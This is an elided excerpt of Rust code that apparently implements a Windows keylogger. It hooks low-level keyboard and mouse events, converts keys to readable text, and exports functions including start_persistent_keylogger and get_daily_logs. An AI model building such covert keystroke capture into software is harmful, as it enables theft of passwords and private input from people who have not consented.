...
mod imp {
    ...
    fn vk_friendly_name(vk: u32) -> Option<&'static str> {
        if let Some(name) = vk_table_lookup(vk) {
            return Some(name);
        }
        match vk as u16 {
    ...
    unsafe fn vk_to_readable(kbd: &KBDLLHOOKSTRUCT) -> String {
        ...
        if !is_modifier_vk(vk) {
            ...
            if GetKeyboardState(&mut key_state).is_ok() {
                ...
                if res > 0 {
                    name = Some(String::from_utf16_lossy(&buf[..res as usize]));
                }
            }
        }
    ...
    pub unsafe extern "system" fn keyboard_proc(
        ...
        if n_code == HC_ACTION as i32 {
            ...
            if msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN {
                ...
                let modifiers = modifier_strings()
                    .into_iter()
                    .map(|s| s.to_string())
                    .collect();
    ...
    pub unsafe extern "system" fn mouse_proc(
        n_code: i32,
        w_param: WPARAM,
        l_param: LPARAM,
    ) -> LRESULT {
            ...
            log_take()
                ...
                .map(|event| {
                    if let Some((x, y)) = event.coordinates {
                        format!(
                            "{}: {} {} ({}, {})",
                            event.event_type, event.action, event.key_or_button, x, y
                        )
                    } else {
...
#[cfg(windows)]
pub use imp::{
    collect_input_events_for, collect_input_events_structured, get_daily_logs, get_statistics,
    load_session_from_file, save_session_to_file, start_persistent_keylogger, InputEvent,
    InputStatistics,
};

#[cfg(not(windows))]
pub fn collect_input_events_for(_duration_ms: u32) -> Vec<String> {
    Vec::new()
}

#[cfg(not(windows))]
pub fn collect_input_events_structured(_duration_ms: u32) -> Vec<InputEvent> {
    Vec::new()
}
...
#[cfg(not(windows))]
pub fn get_daily_logs(_date: &str) -> Vec<InputEvent> {
    Vec::new()
}
